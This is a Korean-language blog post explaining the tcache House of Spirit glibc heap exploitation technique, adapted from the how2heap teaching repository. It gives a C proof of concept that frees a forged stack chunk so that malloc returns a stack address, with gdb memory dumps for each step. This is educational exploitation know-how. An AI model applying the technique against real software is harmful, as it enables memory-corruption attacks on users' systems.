---
title: tcache House of Spirit
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, tcache, house of series]
math: true
mermaid: true
---


## Description

house of spirit과 유사하다.

## Exploit plan

1. fake_chunk 생성 후 fake_chunk[1]에 size(0x40) 저장
2. a 포인터에 &fake_chunk[2] 저장
3. free(a)
4. malloc 시 fake_chunk가 할당됨

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.\n");
    fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
    fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
    fprintf(stderr, "(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

    fprintf(stderr, "Ok. Let's start with the example!.\n\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
    unsigned long long *a; //pointer that will be overwritten
    unsigned long long fake_chunks[10]; //fake chunk region

    fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

    fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

heap memory 생성하기 위해 malloc(0x1)한다.

```
Calling malloc() once so that it sets up its memory.
```

fake_chunk와 a를 선언한다.

```
Let's imagine we will overwrite 1 pointer to point to a fake chunk region.
This region contains one fake chunk. It's size field is placed at 0x7fffffffe258
This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free fortcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 willall be rounded to 0x40, so they would work for the malloc parameter at the end. 
```

fake_chunk[1] 영역(size)에 0x40 저장한다.

```
gdb-peda$ x/24gx $rbp-0x60
0x7fffffffe250: 0x0000000000000009  0x0000000000000040 <- fake chunk
0x7fffffffe260: 0x00007fffffffe2c8  0x0000000000f0b5ff
```

a 포인터에 &fake_chunk[2] 저장한다.

```
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffe258.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
0x7fffffffe248(a):  0x00007fffffffe260
```

a를 free하게되면 tcache list에 a의 주소가 들어간다.

```
Freeing the overwritten pointer.
(0x40)   tcache_entry[2](1): 0x7fffffffe260
```

malloc 시 tcache list에 존재하는 0x7fffffffe260(a) 값 반환된다.

```
Now the next malloc will return the region of our fake chunk at 0x7fffffffe258, which will be 0x7fffffffe260!
malloc(0x30): 0x7fffffffe260
```

## References
- [house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c)